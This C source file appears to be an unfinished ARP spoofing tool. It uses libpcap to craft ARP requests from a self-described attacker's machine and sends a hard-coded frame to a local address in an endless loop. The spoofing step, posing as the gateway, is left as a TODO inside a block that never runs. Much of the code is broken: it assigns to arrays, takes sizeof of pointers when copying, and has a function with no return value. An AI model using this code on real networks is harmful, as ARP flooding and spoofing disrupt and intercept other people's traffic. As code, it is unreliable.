#include <stdlib.h>
#include <stdio.h>

#include <string.h>
#include <pcap/pcap.h>

#include <arpa/inet.h>
#include <stdint.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <zconf.h>

#define true 1
#define false 0

#define ETHER_NET 1
#define IP 0x0800
#define MAC_LEN 6
#define ARP_req 0x0001
#define ARP_rep 0x0002
#define ARP 0x0806

typedef struct{
    u_char hat[2]; // Hardware address Type - 2byte
    u_char pat[2]; // Protocol address Type - 2byte
    u_char hlen; // Hardware address's length - 1byte
    u_char plen; // protocol address's length - 1byte
    u_char opcode[2]; // reply & request - 2byte
    u_char srcMAC[6]; // source protocol address - 6byte
    u_char srcIP[4]; // Source protocol Address - 4byte
    u_char dstMAC[6]; // destination protocol address - 6byte
    u_char dstIP[4]; // destination protocol address - 4byte
}ARP_hdr;

typedef struct{
    u_char destination[6];
    u_char source[6];
    u_char Type[2];
}ETHER_hdr;

typedef struct{
    ETHER_hdr eth;
    ARP_hdr arp;
}packet_type;

int getMyMac(char* myMac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "wlp0s20f3");
    if(!ioctl(fd, SIOCGIFHWADDR, &s)){
        printf("\n");
        for(int i =0; i<6; i++){
            myMac[i] = s.ifr_addr.sa_data[i];
            //printf("%x ", myMac[i]);
        }
    }
    return 1;
}

void setDstMac(u_char* ma, const char* pck){

    for(int i = 0; i< 6; i++){
        ma[i] = pck[i];
    }
}

void setSourceIP(u_char* ip, const char* ip_addr){
    ip[0] = ip_addr[0];
    ip[1] = ip_addr[1];
    ip[2] = ip_addr[2];
    ip[3] = 1;
}

void printMyMac(u_char* myMac){
    for(int i =0; i<5; i++){
        printf("%X:",myMac[i]);
    }
    printf("%02X", myMac[5]);
}

ARP_hdr set_REQ(char* srcmac, char* srcip, char* dstmac, char* dstip){

    ARP_hdr arp;
    arp.hat = htons(0x01);
    arp.pat = htons(0x0800);
    arp.hlen = 6;
    arp.plen = 4;
    arp.opcode = htons(0x0001);
    memcpy(&arp.srcMAC, srcmac, sizeof(srcmac));
    memcpy(&arp.srcIP, srcip, sizeof(srcip));
    memcpy(&arp.dstMAC, dstmac, sizeof(dstmac));
    memcpy(&arp.dstIP, dstip, sizeof(dstip));

    return arp;
}

ETHER_hdr set_ETHER_REQ(u_char* d, u_char* s, ushort t){
    ETHER_hdr eth;
    memcpy(&eth.destination, d, sizeof(d));
    memcpy(&eth.source, s, sizeof(s));
    eth.Type = htons(t);
}

int isARP(const uint8_t* pck){
    if((pck[12] == 0x08) && (pck[13] == 0x06))
        return 1;
    else
        return 0;
}

int isMyRep(const uint8_t* pck, const uint8_t* SenderIP){
    char sameIP = (pck[40] == SenderIP[0]) && (pck[41]==SenderIP[1]);
    char OpIsRep = (pck[20]==0x00 && pck[21]==0x02);
    if(sameIP && OpIsRep){
        return 1;
    }
    return 0;
}

int main(int argc, char *argv[])
{
    packet_type pck;

    u_char myMac[6] = {0,0,0,0,0,0};
//    char* interface = argv[1];
    char* interface = "wlp0s20f3";
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
        return -1;
    }

    if(!getMyMac(myMac)){
        printf("Can't get attacker's MAC address");
        return -5;
    }

    struct pcap_pkthdr* header;
    const uint8_t* packet;

    char srcIP[] = {192,168,43,7};
    char dstIP[] = {192,168,43,137};
    char dstMac[] = {0,0,0,0,0,0};
    char broadCast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    pck.eth = set_ETHER_REQ(broadCast, myMac, ARP);
    pck.arp = set_REQ(myMac, srcIP, dstMac, dstIP);

    u_char data[] ={
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xd0, 0xc6, 0x37, 0xd3, 0x10, 0x0d,
            0x08, 0x06,
            0x00, 0x01,
            0x08, 0x00,
            0x06, 0x04,
            0x00, 0x01,
            0x3c, 0xf0, 0x11, 0x28, 0x2b, 0xbb,
            0xc0, 0xa8, 0x2b, 0x2b,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xc0, 0xa8, 0x2b, 0x89
    };

    while(true){
        pcap_sendpacket(handle, (const u_char*) &data, 42);
    }

    while(false){
        pcap_sendpacket(handle, (const u_char*) &pck, 42);

        struct pcap_pkthdr* header;
        const uint8_t* packet;

        if(pcap_next_ex(handle, &header, &packet) == 0)
            continue;

        if(isARP(packet)){
            printf("@ ");
            if(isMyRep(packet, dstIP)){
                setDstMac(pck.arp.srcMAC, packet);
                //destination MAC받아서


                //ARP 보냄.
                //TODO Sender ip = 게이트웨이
                //받는 IP 는 destination MAC.
                //pck.eth = set_ETHER_REQ()

                setSourceIP(pck.arp.srcIP, packet);

                printf("받음");
            }
        }

    }
    //계속보낼때
    // sender ip:
    for(int i =0; i<4; i++){
        printf("%d.", pck.arp.dstIP[i]);
    }
    printf("\n");
    for(int i =0; i<6; i++){
        printf("%X.", pck.arp.srcMAC[i]);
    }
}